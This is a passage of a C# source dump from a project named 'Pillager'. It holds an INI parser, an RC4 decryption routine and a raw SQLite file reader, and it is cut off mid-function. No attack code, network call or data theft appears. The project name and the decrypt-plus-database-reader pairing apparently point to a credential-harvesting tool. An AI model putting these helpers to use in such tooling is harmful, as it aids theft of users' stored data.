            //Section names and key names are case insensitive 
            sectionName = sectionName.ToLower();
            key = key.ToLower();

            int index = -1;
            if (sectionMap.TryGetValue(sectionName, out var section))
            {
                //Search through the list to find the key if it exists
                for (int i = 0; i < section.Count; i++)
                {
                    if (section[i].type != LineType.KeyValue) continue;

                    if (section[i].key.ToLower() == key)
                    {
                        index = i;
                    }
                }
                if (index > -1)
                {
                    //remove the item from our list
                    section.RemoveAt(index);

                    //TOOD: This might not be a desired behavior
                    //See if we can delete the whole section
                    if (!IniListContainstype(section, LineType.KeyValue))
                    {
                        section.Clear();
                        sectionMap[sectionName] = null;
                        for (int i = structureOrder.Count - 1; i >= 0; i--)
                        {
                            if (structureOrder[i] == sectionName)
                            {
                                structureOrder.RemoveAt(i);
                                break;
                            }
                        }
                    }
                    return true;
                }
            }
            return false;
        }

        /// <summary>
        /// Given a section name, deletes the whole section if it is found
        /// </summary>
        /// <param name="sectionName"></param>
        /// <returns>true if section was deleted, false otherwise</returns>
        public bool DeleteSection(string sectionName)
        {
            //Section names are case insensitive 
            sectionName = sectionName.ToLower();

            if (sectionMap.TryGetValue(sectionName, out var section))
            {
                section.Clear();
                sectionMap[sectionName] = null;
                for (int i = structureOrder.Count - 1; i >= 0; i--)
                {
                    if (structureOrder[i] == sectionName)
                    {
                        structureOrder.RemoveAt(i);
                        break;
                    }
                }
                return true;
            }
            return false;
        }

        /// <summary>
        /// Removes the given key from the default section
        /// </summary>
        /// <param name="key">Name of the key to be removed</param>
        /// <returns>True if the key was found and removed, false if it was not found</returns>
        public bool Delete(string key)
        {
            return Delete(DEFAULT_SECTION, key);
        }

        /// <summary>
        /// Determines if the specified key is an array
        /// </summary>
        /// <param name="key"></param>
        /// <param name="sectionName"></param>
        /// <returns>true if the key data is an array, false otherwise</returns>
        public bool IsArray(string key, string sectionName = DEFAULT_SECTION)
        {
            if (GetLineInfo(key, sectionName, out var info))
                return info.IsArray;
            return false;
        }

        /// <summary>
        /// Returns a string containing the contents of the ini data
        /// </summary>
        public override string ToString()
        {
            var enumerator = Lines();

            StringBuilder sb = new StringBuilder();
            while (enumerator.MoveNext())
            {
                if (enumerator.Current != null)
                    sb.AppendLine(enumerator.Current);
            }
            return sb.ToString();
        }

        #endregion

        void PostProcess()
        {
            HandleDefaultSection();
        }

        /// <summary>
        /// This method handles naming the default section and ordering the section header to be where it should be
        /// </summary>
        void HandleDefaultSection()
        {
            //Here we look for the default section. If we don't find one, no worries
            if (sectionMap.TryGetValue(defaultSectionLowerCased, out var defsection))
            {
                //If there is a section header in here and it is NOT the first item in the list, move it to BEFORE the first key value pair
                //This lets us support comments before the first section header
                if (defsection[0].type != LineType.Section && IniListContainstype(defsection, LineType.Section) && defsection.Count > 1)
                {
                    //Remove the previous default section header
                    for (int i = defsection.Count - 1; i >= 0; i--)
                    {
                        if (defsection[i].type == LineType.Section)
                        {
                            defsection.RemoveAt(i);
                            break;
                        }
                    }

                    //Now move it to just after the first couple of comments
                    int insertIndex = -1;
                    for (int i = 0; i < defsection.Count; i++)
                    {
                        if (defsection[i].type != LineType.Comment && defsection[i].type != LineType.Section)
                        {
                            insertIndex = i;
                            break;
                        }
                    }
                    if (insertIndex != -1)
                    {
                        defsection.Insert(insertIndex, new IniLine { type = LineType.Section, section = DEFAULT_SECTION });
                    }
                }
            }
        }

        /// <summary>
        /// Given a Key and a section name, this method returns the corresponding IniLine object
        /// </summary>
        /// <param name="key"></param>
        /// <param name="sectionName"></param>
        /// <returns>true if the IniLine was found, false otherwise</returns>
        bool GetLineInfo(string key, string sectionName, out IniLine info)
        {
            //Section names and key names are case insensitive 
            sectionName = sectionName.ToLower();
            key = key.ToLower();

            if (sectionMap.TryGetValue(sectionName, out var section))
            {
                //Search through the list to find the key if it exists
                for (int i = 0; i < section.Count; i++)
                {
                    if (section[i].type != LineType.KeyValue) continue;

                    if (section[i].key.ToLower() == key)
                    {
                        info = section[i];
                        return true;
                    }
                }
            }
            info = new IniLine { type = LineType.None };
            return false;
        }

        /// <summary>
        /// Gets the section list for the given section name
        /// </summary>
        /// <param name="sectionName"></param>
        /// <returns>The section list or null if it is not found</returns>
        List<IniLine> GetSectionList(string sectionName)
        {
            //Section names are case insensitive 
            sectionName = sectionName.ToLower();

            if (sectionMap.TryGetValue(sectionName, out var section))
                return section;
            return null;
        }

        /// <summary>
        /// Gets the index for the given key and the given section List
        /// </summary>
        /// <param name="key"></param>
        /// <param name="section"></param>
        /// <returns>The index for the IniLine that contains the key, null otherwise</returns>
        int GetKeyIndex(string key, List<IniLine> section)
        {
            if (section == null) return -1;

            //keys are case insensitive 
            key = key.ToLower();

            //Search through the list to find the key if it exists
            for (int i = 0; i < section.Count; i++)
            {
                if (section[i].type != LineType.KeyValue) continue;

                if (section[i].key.ToLower() == key)
                {
                    return i;
                }
            }
            return -1;
        }

        /// <summary>
        /// Replaces an existing iniLine with the new one given that
        /// the key name is still the same. If it is not , then this will do nothing
        /// </summary>
        /// <param name="newIniLine"></param>
        /// <returns></returns>
        bool ReplaceIniLine(IniLine newIniLine)
        {
            var sectionList = GetSectionList(newIniLine.section);
            if (sectionList == null) return false;

            int index = GetKeyIndex(newIniLine.key, sectionList);

            if (index > -1)
            {
                sectionList[index] = newIniLine;
                return true;
            }
            return false;
        }

        /// <summary>
        /// Returns the index of the first input key/value separator it finds, or -1
        /// </summary>
        /// <param name="txt"></param>
        /// <returns>Index of the first input KV separator in the string or -1 if not found</returns>
        int IndexOfKvSeparator(string txt)
        {
            return txt.IndexOf(inputKVSeparator);
        }

        /// <summary>
        /// Adds the given IniLine to its apropriate section list. If the section list does not exist, it is created.
        /// If the IniLine type is a section header, it will also add the section name to the structure order list.
        /// This allows comments that are placed before the first section to show up in the right place when output
        /// </summary>
        /// <param name="current"></param>
        void AddIniLine(IniLine current)
        {
            string sectionLowerCased = current.section.ToLower();
            //Only Sections are added to our structure
            //Otherwise we add them to our sections dictionary
            //The structure list allows us to keep the general structure of the file
            if (current.type == LineType.Section)
            {
                //Add it to our structure order list if it does not already exist
                if (!structureOrder.Contains(current.section.ToLower()))
                    structureOrder.Add(current.section.ToLower());
            }
            else if (sectionLowerCased == defaultSectionLowerCased)
            {
                //If the section of this inline matches our default section, we must add it to the struct list
                if (!structureOrder.Contains(current.section.ToLower()))
                    structureOrder.Add(defaultSectionLowerCased);
            }

            //Add this key value pair to the specified section List

            //If the section List does not exist, create it
            if (!sectionMap.TryGetValue(sectionLowerCased, out var section))
            {
                //Ini files are supposed to be case insensitive so we lowercase all our keys
                //for lookup only
                sectionMap[sectionLowerCased] = new List<IniLine>();
                section = sectionMap[sectionLowerCased];
            }

            //Otherwise, if it is a section header, make sure that one is not already in this section list
            if (current.type != LineType.Section || (
                current.type == LineType.Section && !IniListContainstype(section, LineType.Section)))
            {
                section.Add(current);
            }
        }

        /// <summary>
        /// Given a List of IniLines, this method checks to see if there are
        /// any lines within it of the given type
        /// </summary>
        /// <param name="lines"></param>
        /// <param name="type"></param>
        /// <returns>true if a line with the given type was found, false otherwise</returns>
        bool IniListContainstype(List<IniLine> lines, LineType type)
        {
            for (int i = 0; i < lines.Count; i++)
            {
                if (lines[i].type == type) return true;
            }
            return false;
        }

        #region Logging methods
        void FireLogWarning(string text, params object[] args)
        {
            string msg = $"[line {lineNumber}] WARN: {string.Format(text, args)}";

            LogWarning?.Invoke(msg);
        }

        void FireLogError(string text, params object[] args)
        {
            string msg = $"[line {lineNumber}] ERR: {string.Format(text, args)}";
            LogError?.Invoke(msg);
        }
        #endregion

        #region Parse Methods

        /// <summary>
        /// Parses the current line of text looking for ini config elements 
        /// </summary>
        /// <param name="line"></param>
        void Parse(string line)
        {
            //Is this line a valid comment?
            if (ParseLineComment(line, out var current))
            {
                AddIniLine(current);
            }
            else if (ParseSection(line, out current))
            {
                AddIniLine(current);
            }
            else if (ParseKeyValue(line, out current))
            {
                AddIniLine(current);
            }
            lineNumber++;
        }

        /// <summary>
        /// Looks for a line comment in the given string and if it finds one, it returns an IniLine representation of it
        /// </summary>
        /// <param name="line"></param>
        /// <returns>An IniLine with the line comment info, null otherwise</returns>
        bool ParseLineComment(string line, out IniLine info)
        {
            ///start out with an empty iniLine object
            info = new IniLine();

            if (string.IsNullOrEmpty(line) || line.IsWhiteSpace() || line[0] != ';')
                return false;
            info = new IniLine { type = LineType.Comment, section = currentSection, comment = line.Substring(1, line.Length - 1) };
            return true;
        }

        /// <summary>
        /// Looks for a section header in the given string and if it finds one, it returns an IniLine representation of it
        /// </summary>
        /// <param name="line"></param>
        /// <returns>An IniLine with the section header info, null otherwise</returns>
        bool ParseSection(string line, out IniLine info)
        {
            ///start out with an empty iniLine object
            info = new IniLine();

            if (string.IsNullOrEmpty(line) || line.IsWhiteSpace() || line[0] != '[' || line.IndexOf(']') == -1) return false;

            StringBuilder sectionName = new StringBuilder();

            for (int i = 1; i < line.Length; i++)
            {
                if (line[i] == ']') break;

                //Technically ini section names are not supposed to contain spaces, but we can handle it just fine so allow it
                //else if (char.IsWhiteSpace(line[i]))
                //{
                //    //TODO: Inidicate which line we are on and what we did
                //    LogWarning("Section names are not supposed to have spaces, but I can handle it.");
                //}

                sectionName.Append(line[i]);
            }

            if (sectionName.Length == 0)
                return false;
            //Is there a comment Inline with this section?
            string comment = null;
            if (line.IndexOf(';') != -1 && line.IndexOf(';') < line.Length - 1)
            {
                comment = line.Substring(line.IndexOf(';') + 1, (line.Length - 1) - (line.IndexOf(';')));

                //Is the comment empty?
                if (string.IsNullOrEmpty(comment) || comment.IsWhiteSpace()) comment = null;
            }

            currentSection = sectionName.ToString();

            info = new IniLine { type = LineType.Section, section = sectionName.ToString(), comment = comment };
            return true;
        }

        /// <summary>
        /// This looks for a value, double or single quoted, or no quotes and
        /// optionally an inline comment and returns this info in an IniLine object
        /// It the value is an array, it is converted and returned also
        /// </summary>
        /// <param name="input"></param>
        /// <param name="startIndex"></param>
        /// <returns>true on success, false otherwise</returns>
        bool ParseValue(string input, int startIndex, out IniLine info)
        {
            char quoteChar = '\0';

            if (startIndex >= input.Length)
            {
                info = new IniLine();
                return false;
            }

            //Zip past any leading whitespace
            while (char.IsWhiteSpace(input[startIndex]) && startIndex < input.Length) startIndex++;

            //Look for a quoted string
            int numQuotes = input.CountChar('"', startIndex);

            //Ignore a quote with no matching end
            if (numQuotes < 2)
            {
                //Try single quotes
                numQuotes = input.CountChar('\'', startIndex);

                if (numQuotes < 2)
                    numQuotes = -1;
            }
            int endIndex = -1;

            StringBuilder val = new StringBuilder(input.Length - startIndex);

            //Parse the string 
            for (int i = startIndex; i < input.Length; i++)
            {
                //Have we discovered an inline Comment?
                if (numQuotes == -1 && input[i] == ';')
                {
                    endIndex = i;
                    break;
                }
                if (numQuotes > 0 && (input[i] == '"' || input[i] == '\''))
                {
                    numQuotes--;
                    if (numQuotes == 0)
                    {
                        //Set the quote character for this value
                        quoteChar = input[i];

                        //Remove the 1st quote from the value
                        val.Remove(0, 1);

                        //Put the end index just after our quote char, or if it is the last value, set endIndex = -1
                        endIndex = i + 1;
                        if (endIndex >= input.Length)
                            endIndex = -1;

                        break;
                    }
                }
                val.Append(input[i]);
            }

            //Is there an inline comment?
            string comment = null;
            if (endIndex > -1)
            {
                //zip us past any whitespace
                while (endIndex < input.Length && char.IsWhiteSpace(input[endIndex])) endIndex++;

                if (input[endIndex] == ';' & endIndex + 1 < input.Length)
                {
                    comment = input.Substring(endIndex + 1, input.Length - (endIndex + 1));
                }
            }

            string value = val.ToString();
            string[] vals = null;

            //If this was not a quoted string, check and see if it is a csv list
            if (quoteChar == '\0' && value.IndexOf(',') > -1)
            {
                vals = value.Split(',').Select(csv => csv.Trim()).ToArray();

                //The array field cannot contain just one element
                if (vals.Length == 1)
                    vals = null;
                //else
                //    value = null;
            }

            //Ok then return what we found
            info = new IniLine { type = LineType.KeyValue, value = value, comment = comment, quotechar = quoteChar, array = vals };
            return true;
        }

        /// <summary>
        /// Looks for a Key/Value pair in the given string and if it finds one, it returns an IniLine representation of it
        /// </summary>
        /// <param name="input"></param>
        /// <returns>An IniLine with the parsed Key/Value info, null otherwise</returns>
        bool ParseKeyValue(string input, out IniLine info)
        {
            //To start, just make our info object empty
            info = new IniLine();

            if (string.IsNullOrEmpty(input) || input.IsWhiteSpace()) return false;

            var kvSeparatorIndex = IndexOfKvSeparator(input);
            if (kvSeparatorIndex == -1) return false;

            //Get the key
            StringBuilder k = new StringBuilder();
            for (int i = 0; i < kvSeparatorIndex; i++)
            {
                //There cannot be a space in the key name. if we see a space, we break out
                if (char.IsWhiteSpace(input[i]))
                {
                    FireLogWarning("Key names can't contain spaces. {0} was truncated to {1}", input.Substring(0, kvSeparatorIndex), k.ToString());
                    break;
                }

                k.Append(input[i]);
            }

            //Does a key exist? If not, Abort
            if (k.Length == 0) return false;


            //Is there a value?
            int startIndex = kvSeparatorIndex + 1;

            //Parse the rest of the string looking for a value, or a csv array and an optional inline comment
            if (!ParseValue(input, startIndex, out info))
                return false;
            //Add the current section name and the key to this and we are done
            info.section = currentSection;
            info.key = k.ToString();
            return true;
        }
        #endregion

        /// <summary>
        /// When given an IniLine struct, this method returns the string representation of it
        /// </summary>
        /// <param name="iniStruct"></param>
        /// <returns></returns>
        string GetString(IniLine iniStruct)
        {
            switch (iniStruct.type)
            {
                case LineType.Comment:
                    return $";{iniStruct.comment}";
                case LineType.KeyValue:
                    string val = iniStruct.value;

                    if (iniStruct.array != null)
                    {
                        val = string.Join(", ", iniStruct.array);
                    }

                    if (!string.IsNullOrEmpty(iniStruct.comment))
                    {
                        if (iniStruct.quotechar > 0)
                            return string.Format("{0}{1}{4}{2}{4} ;{3}", iniStruct.key, outputKVSeparator, val, iniStruct.comment, iniStruct.quotechar);
                        return $"{iniStruct.key}{outputKVSeparator}{val} ;{iniStruct.comment}";
                    }

                    //If the value begins or ends with whitespace, a ; or either the input or output kv separator, put it in quotes
                    if (iniStruct.quotechar > 0)
                        return string.Format("{0}{1}{3}{2}{3}", iniStruct.key, outputKVSeparator, val, iniStruct.quotechar);
                    return $"{iniStruct.key}{outputKVSeparator}{val}";
                case LineType.Section:
                    if (!string.IsNullOrEmpty(iniStruct.comment))
                        return $"[{iniStruct.section}] ;{iniStruct.comment}";
                    return $"[{iniStruct.section}]";
                default:
                    return string.Empty;
            }
        }

        /// <summary>
        /// This does the output formatting
        /// </summary>
        /// <returns></returns>
        IEnumerator<string> Lines()
        {
            //We will use this to tell us what line type came before the current
            LineType prevType = LineType.None;

            //By definition, these IniLine instances should all be sections
            foreach (var st in structureOrder)
            {
                if (sectionMap.TryGetValue(st, out List<IniLine> section))
                {
                    //Console.WriteLine("Length [{0}]: {1}", st, section.Count);
                    foreach (var line in section)
                    {
                        //Here we check of we need to yield a blank line or not
                        if ((emptyLinesBetweenSections && line.type == LineType.Section && prevType == LineType.KeyValue) ||
                            (emptyLineAboveComments && line.type == LineType.Comment && prevType == LineType.KeyValue) ||
                            (emptyLinesBetweenKeyValuePairs && ((line.type == LineType.KeyValue && prevType == LineType.KeyValue) ||
                            (line.type == LineType.KeyValue && prevType == LineType.Section)))
                            )
                            yield return string.Empty;

                        yield return GetString(line);
                        prevType = line.type;
                    }
                }
                else
                {
                    throw new Exception("Unable to find the section in the dictionary list: " + st);
                }
            }
        }
    }
}

```

`Pillager/Helper/RC4Crypt.cs`:

```cs
using System.Collections.Generic;
using System.Linq;

namespace Pillager.Helper
{
    public static class RC4Crypt
    {
        /// <summary>
        /// Decrypt data using key.
        /// </summary>
        /// <param name="key"></param>
        /// <param name="data"></param>
        /// <returns></returns>
        public static byte[] Decrypt(byte[] key, byte[] data)
        {
            return EncryptOutput(key, data).ToArray();
        }

        /// <summary>
        /// Init our encryption.
        /// </summary>
        /// <param name="key"></param>
        /// <returns></returns>
        private static byte[] EncryptInitalize(byte[] key)
        {
            byte[] s = Enumerable.Range(0, 256)
              .Select(i => (byte)i)
              .ToArray();

            for (int i = 0, j = 0; i < 256; i++)
            {
                j = (j + key[i % key.Length] + s[i]) & 255;

                Swap(s, i, j);
            }

            return s;
        }

        /// <summary>
        /// Loop
        /// </summary>
        /// <param name="key"></param>
        /// <param name="data"></param>
        /// <returns></returns>
        private static IEnumerable<byte> EncryptOutput(byte[] key, IEnumerable<byte> data)
        {
            byte[] s = EncryptInitalize(key);

            int i = 0;
            int j = 0;

            return data.Select(b =>
            {
                i = (i + 1) & 255;
                j = (j + s[i]) & 255;

                Swap(s, i, j);

                return (byte)(b ^ s[(s[i] + s[j]) & 255]);
            });
        }

        /// <summary>
        /// Swap byte.
        /// </summary>
        /// <param name="s"></param>
        /// <param name="i"></param>
        /// <param name="j"></param>
        private static void Swap(byte[] s, int i, int j)
        {
            byte c = s[i];

            s[i] = s[j];
            s[j] = c;
        }
    }
}

```

`Pillager/Helper/SQLiteHandler.cs`:

```cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Pillager.Helper
{
    public class SQLiteHandler
    {
        private readonly byte[] db_bytes;
        private readonly ulong encoding;
        private string[] field_names = new string[1];
        private sqlite_master_entry[] master_table_entries;
        private readonly ushort page_size;
        private readonly byte[] SQLDataTypeSize = { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
        private table_entry[] table_entries;

        public SQLiteHandler(string baseName)
        {
            if (File.Exists(baseName))
            {
                db_bytes = File.ReadAllBytes(baseName);
                if (Encoding.Default.GetString(db_bytes, 0, 15).CompareTo("SQLite format 3") != 0)
                {
                    throw new Exception("Not a valid SQLite 3 Database File");
                }

                if (db_bytes[0x34] != 0)
                {
                    throw new Exception("Auto-vacuum capable database is not supported");
                }

                //if (decimal.Compare(new decimal(this.ConvertToInteger(0x2c, 4)), 4M) >= 0)
                //{
                //    throw new Exception("No supported Schema layer file-format");
                //}
                page_size = (ushort)ConvertToInteger(0x10, 2);
                encoding = ConvertToInteger(0x38, 4);
                if (decimal.Compare(new decimal(encoding), decimal.Zero) == 0)
                {
                    encoding = 1L;
                }

                ReadMasterTable(100L);
            }
        }

        private ulong ConvertToInteger(int startIndex, int Size)
        {
            if (Size > 8 | Size == 0)
            {
                return 0L;
            }

            ulong num2 = 0L;
            int num4 = Size - 1;
            for (int i = 0; i <= num4; i++)
            {
                num2 = num2 << 8 | db_bytes[startIndex + i];
            }

            return num2;
        }

        private long CVL(int startIndex, int endIndex)
        {
            endIndex++;
            byte[] buffer = new byte[8];
            int num4 = endIndex - startIndex;
            bool flag = false;
            if (num4 == 0 | num4 > 9)
            {
                return 0L;
            }

            if (num4 == 1)
            {
                buffer[0] = (byte)(db_bytes[startIndex] & 0x7f);
                return BitConverter.ToInt64(buffer, 0);
            }

            if (num4 == 9)
            {
                flag = true;
            }

            int num2 = 1;
            int num3 = 7;
            int index = 0;
            if (flag)
            {
                buffer[0] = db_bytes[endIndex - 1];
                endIndex--;
                index = 1;
            }

            int num7 = startIndex;
            for (int i = endIndex - 1; i >= num7; i += -1)
            {
                if (i - 1 >= startIndex)
                {
                    buffer[index] = (byte)((byte)(db_bytes[i] >> (num2 - 1 & 7)) & 0xff >> num2 | (byte)(db_bytes[i - 1] << (num3 & 7)));
                    num2++;
                    index++;
                    num3--;
                }
                else if (!flag)
                {
                    buffer[index] = (byte)((byte)(db_bytes[i] >> (num2 - 1 & 7)) & 0xff >> num2);
                }
            }

            return BitConverter.ToInt64(buffer, 0);
        }

        public int GetRowCount()
        {
            return table_entries.Length;
        }

        public string[] GetTableNames()
        {
            var tableNames = new List<string>();
            int num3 = master_table_entries.Length - 1;
            for (int i = 0; i <= num3; i++)
            {
                if (master_table_entries[i].item_type == "table")
                {
                    tableNames.Add(master_table_entries[i].item_name);
                }
            }

            return tableNames.ToArray();
        }

        public long GetRawID(int row_num)
        {
            if (row_num >= table_entries.Length)
            {
                return 0;
            }

            return table_entries[row_num].row_id;
        }

        public string GetValue(int row_num, int field)
        {
            if (row_num >= table_entries.Length)
            {
                return null;
            }

            if (field >= table_entries[row_num].content.Length)
            {
                return null;
            }

            return table_entries[row_num].content[field];
        }

        public string GetValue(int row_num, string field)
        {
            int num = -1;
            int length = field_names.Length - 1;
            for (int i = 0; i <= length; i++)
            {
                if (field_names[i].ToLower().CompareTo(field.ToLower()) == 0)
                {
                    num = i;
                    break;
                }
            }

            if (num == -1)
            {
                return null;
            }

            return GetValue(row_num, num);
        }

        private int GVL(int startIndex)
        {
            if (startIndex > db_bytes.Length)
            {
                return 0;
            }

            int num3 = startIndex + 8;
            for (int i = startIndex; i <= num3; i++)
            {
                if (i > db_bytes.Length - 1)
                {
                    return 0;
                }

                if ((db_bytes[i] & 0x80) != 0x80)
                {
                    return i;
                }
            }

            return startIndex + 8;
        }

        private bool IsOdd(long value)
        {
            return (value & 1L) == 1L;
        }

        private void ReadMasterTable(ulong Offset)
        {
            if (db_bytes[(int)Offset] == 13)
            {
                ushort num2 = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int length = 0;
                if (master_table_entries != null)
                {
                    length = master_table_entries.Length;
                    Array.Resize(ref master_table_entries, master_table_entries.Length + num2 + 1);
                }
                else
                {
                    master_table_entries = new sqlite_master_entry[num2 + 1];
                }

                int num13 = num2;
                for (int i = 0; i <= num13; i++)
                {
                    ulong num = ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8M), new decimal(i * 2))), 2);
                    if (decimal.Compare(new decimal(Offset), 100M) != 0)
                    {
                        num += Offset;
                    }

                    int endIndex = GVL((int)num);
                    long num7 = CVL((int)num, endIndex);
                    int num6 = GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)));
                    master_table_entries[length + i].row_id = CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)),
                        num6);
                    num = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(num6), new decimal(num))), decimal.One));
                    endIndex = GVL((int)num);
                    num6 = endIndex;
                    long num5 = CVL((int)num, endIndex);
                    long[] numArray = new long[5];
                    int index = 0;
                    do
                    {
                        endIndex = num6 + 1;
                        num6 = GVL(endIndex);
                        numArray[index] = CVL(endIndex, num6);
                        if (numArray[index] > 9L)
                        {
                            if (IsOdd(numArray[index]))
                            {
                                numArray[index] = (long)Math.Round((numArray[index] - 13L) / 2.0);
                            }
                            else
                            {
                                numArray[index] = (long)Math.Round((numArray[index] - 12L) / 2.0);
                            }
                        }
                        else
                        {
                            numArray[index] = SQLDataTypeSize[(int)numArray[index]];
                        }

                        index++;
                    } while (index <= 4);

                    if (decimal.Compare(new decimal(encoding), decimal.One) == 0)
                    {
                        master_table_entries[length + i].item_type = Encoding.UTF8.GetString(db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                    }
                    else if (decimal.Compare(new decimal(encoding), 2M) == 0)
                    {
                        master_table_entries[length + i].item_type = Encoding.Unicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                    }
                    else if (decimal.Compare(new decimal(encoding), 3M) == 0)
                    {
                        master_table_entries[length + i].item_type = Encoding.BigEndianUnicode.GetString(db_bytes, Convert.ToInt32(decimal.Add(new decimal(num), new decimal(num5))), (int)numArray[0]);
                    }

                    if (decimal.Compare(new decimal(encoding), decimal.One) == 0)
                    {
                        master_table_entries[length + i].item_name = Encoding.Default.GetString(db_bytes,
                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                    }
                    else if (decimal.Compare(new decimal(encoding), 2M) == 0)
                    {
                        master_table_entries[length + i].item_name = Encoding.Unicode.GetString(db_bytes,
                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                    }
                    else if (decimal.Compare(new decimal(encoding), 3M) == 0)
                    {
                        master_table_entries[length + i].item_name = Encoding.BigEndianUnicode.GetString(db_bytes,
                            Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0]))), (int)numArray[1]);
                    }

                    master_table_entries[length + i].root_num =
                        (long)ConvertToInteger(
                            Convert.ToInt32(decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])),
                                new decimal(numArray[2]))), (int)numArray[3]);
                    if (decimal.Compare(new decimal(encoding), decimal.One) == 0)
                    {
                        master_table_entries[length + i].sql_statement = Encoding.Default.GetString(db_bytes,
                            Convert.ToInt32(decimal.Add(
                                decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])),
                                new decimal(numArray[3]))), (int)numArray[4]);
                    }
                    else if (decimal.Compare(new decimal(encoding), 2M) == 0)
                    {
                        master_table_entries[length + i].sql_statement = Encoding.Unicode.GetString(db_bytes,
                            Convert.ToInt32(decimal.Add(
                                decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])),
                                new decimal(numArray[3]))), (int)numArray[4]);
                    }
                    else if (decimal.Compare(new decimal(encoding), 3M) == 0)
                    {
                        master_table_entries[length + i].sql_statement = Encoding.BigEndianUnicode.GetString(db_bytes,
                            Convert.ToInt32(decimal.Add(
                                decimal.Add(decimal.Add(decimal.Add(decimal.Add(new decimal(num), new decimal(num5)), new decimal(numArray[0])), new decimal(numArray[1])), new decimal(numArray[2])),
                                new decimal(numArray[3]))), (int)numArray[4]);
                    }
                }
            }
            else if (db_bytes[(int)Offset] == 5)
            {
                ushort num11 = Convert.ToUInt16(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int num14 = num11;
                for (int j = 0; j <= num14; j++)
                {
                    ushort startIndex = (ushort)ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 12M), new decimal(j * 2))), 2);
                    ReadMasterTable(decimal.Compare(new decimal(Offset), 100M) == 0
                        ? Convert.ToUInt64(decimal.Multiply(
                            decimal.Subtract(new decimal(ConvertToInteger(startIndex, 4)), decimal.One),
                            new decimal(page_size)))
                        : Convert.ToUInt64(decimal.Multiply(
                            decimal.Subtract(new decimal(ConvertToInteger((int)(Offset + startIndex), 4)), decimal.One),
                            new decimal(page_size))));
                }

                ReadMasterTable(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 8M)), 4)), decimal.One),
                    new decimal(page_size))));
            }
        }

        public bool ReadTable(string TableName)
        {
            int index = -1;
            int length = master_table_entries.Length - 1;
            for (int i = 0; i <= length; i++)
            {
                if (master_table_entries[i].item_name.ToLower().CompareTo(TableName.ToLower()) == 0)
                {
                    index = i;
                    break;
                }
            }

            if (index == -1)
            {
                return false;
            }

            string[] strArray = master_table_entries[index].sql_statement.Substring(master_table_entries[index].sql_statement.IndexOf("(") + 1).Split(',');
            int num6 = strArray.Length - 1;
            for (int j = 0; j <= num6; j++)
            {
                strArray[j] = strArray[j].TrimStart();
                int num4 = strArray[j].IndexOf(" ");
                if (num4 > 0)
                {
                    strArray[j] = strArray[j].Substring(0, num4);
                }

                if (strArray[j].IndexOf("UNIQUE") == 0)
                {
                    break;
                }

                Array.Resize(ref field_names, j + 1);
                field_names[j] = strArray[j];
            }

            return ReadTableFromOffset((ulong)((master_table_entries[index].root_num - 1L) * page_size));
        }

        private bool ReadTableFromOffset(ulong Offset)
        {
            if (db_bytes[(int)Offset] == 13)
            {
                int num2 = Convert.ToInt32(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), 3M)), 2)), decimal.One));
                int length = 0;
                if (table_entries != null)
                {
                    length = table_entries.Length;
                    Array.Resize(ref table_entries, table_entries.Length + num2 + 1);
                }
                else
                {
                    table_entries = new table_entry[num2 + 1];
                }

                int num16 = num2;
                for (int i = 0; i <= num16; i++)
                {
                    var _fieldArray = new record_header_field[1];
                    ulong num = ConvertToInteger(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(Offset), 8M), new decimal(i * 2))), 2);
                    if (decimal.Compare(new decimal(Offset), 100M) != 0)
                    {
                        num += Offset;
                    }

                    int endIndex = GVL((int)num);
                    long num9 = CVL((int)num, endIndex);
                    int num8 = GVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)));
                    table_entries[length + i].row_id = CVL(Convert.ToInt32(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(endIndex), new decimal(num))), decimal.One)), num8);
                    num = Convert.ToUInt64(decimal.Add(decimal.Add(new decimal(num), decimal.Subtract(new decimal(num8), new decimal(num))), decimal.One));
                    endIndex = GVL((int)num);
                    num8 = endIndex;
                    long num7 = CVL((int)num, endIndex);
                    long num10 = Convert.ToInt64(decimal.Add(decimal.Subtract(new decimal(num), new decimal(endIndex)), decimal.One));
                    for (int j = 0; num10 < num7; j++)
                    {
                        Array.Resize(ref _fieldArray, j + 1);
                        endIndex = num8 + 1;
                        num8 = GVL(endIndex);
                        _fieldArray[j].type = CVL(endIndex, num8);
                        if (_fieldArray[j].type > 9L)
                        {
                            if (IsOdd(_fieldArray[j].type))
                            {
